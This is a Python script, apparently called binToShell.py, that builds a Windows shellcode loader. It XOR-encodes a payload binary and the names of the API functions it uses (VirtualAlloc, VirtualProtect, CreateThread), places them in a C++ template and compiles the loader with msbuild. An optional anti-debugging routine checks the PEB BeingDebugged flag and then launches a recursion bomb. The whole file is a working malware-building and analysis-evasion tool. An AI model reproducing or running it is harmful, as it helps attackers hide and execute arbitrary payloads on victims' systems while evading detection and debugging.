import binascii
import argparse
import subprocess
import os

def init_args():
    parser = argparse.ArgumentParser(
                    prog='binToShell.py',
                    description='Generate shellcode from bin file',
                    epilog='Nice Conversions :)')
    parser.add_argument('-b', '--bin', help='The binary file to convert to nice unsigned char shellcode', required=True)
    parser.add_argument('-x', '--xor', help='XOR key to encrypt with', default='')
    parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', dest='debug', action='store_true')

    return parser.parse_args()

def xor(data, key):
    outBytes = b''
    keyLen = len(key)
    for n, i in enumerate(data):
        outBytes += (i ^ key[n % keyLen]).to_bytes(1, "big")

    return outBytes

if __name__ == '__main__':
    args = init_args()
    ANTI_DEBUG = '''int recursion_bomb(int depth)
{
    int sum = 0;
    if (depth == 0)
    {
        return sum + 1;
    }

    for (int i = 0; i < 100000000000; i++)
    {
        sum += recursion_bomb(depth - 1) + 5;
    }
}


void antiDebug()
{
	PPEB pebPtr;
	// Thread Environment Block (TEB)
	#if defined(_M_X64) // x64
	PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
	#else // x86
	PTEB tebPtr = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
	#endif
	// Process Environment Block (PEB)
	pebPtr = tebPtr->ProcessEnvironmentBlock;
	if (pebPtr->BeingDebugged)
    {
        recursion_bomb(100000000);
        exit(1);
    }
}'''
    funcs = [('Kernel32.dll', '<KERNEL32>'), ('CreateThread', '<CREATE_THREAD>'), ('VirtualAlloc', '<VIRTUAL_ALLOC>'), ('VirtualProtect', '<VIRTUAL_PROTECT>')]
    with open("./Source.cpp", 'r') as f:
        source = f.read()

    try:
        with open(args.bin, 'rb') as f:
            binData = f.read()

        if args.xor:
            binData = xor(bytearray(binData), args.xor.encode())
            # print(binData)
            # quit()

        stringConstruct = "unsigned char shellcode[] = \n\""

        for n, i in enumerate(binData):
            stringConstruct += f"\\{hex(i)[1:]}"
            if (n + 1) % 14 == 0:
                stringConstruct += '"\n"'
        stringConstruct += '";'
        source = source.replace('<SHELLCODE>', stringConstruct)
        source = source.replace('<XOR_KEY>', f'"{args.xor}"')

        # XOR and encrypt dynamic invoke stuff
        for func in funcs:
            data = xor(func[0].encode() + b'\0', args.xor.encode())
            stringConstruct = "\""
            for n, i in enumerate(data):
                stringConstruct += f"\\{hex(i)[1:]}"
            stringConstruct += '";'

            source = source.replace(func[1], stringConstruct)

        if args.debug:
            source = source.replace('<ANTI_DEBUG>', ANTI_DEBUG)
        else:
            source = source.replace('<ANTI_DEBUG>', 'void antiDebug(){}')

        with open('ShellcodeLoaderBuilder/Source.cpp', 'w') as f:
            f.write(source)

        os.system("msbuild ShellcodeLoaderBuilder.sln /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None")
        os.remove("ShellcodeLoaderBuilder/Source.cpp")
    except FileNotFoundError:
        print('Invalid file')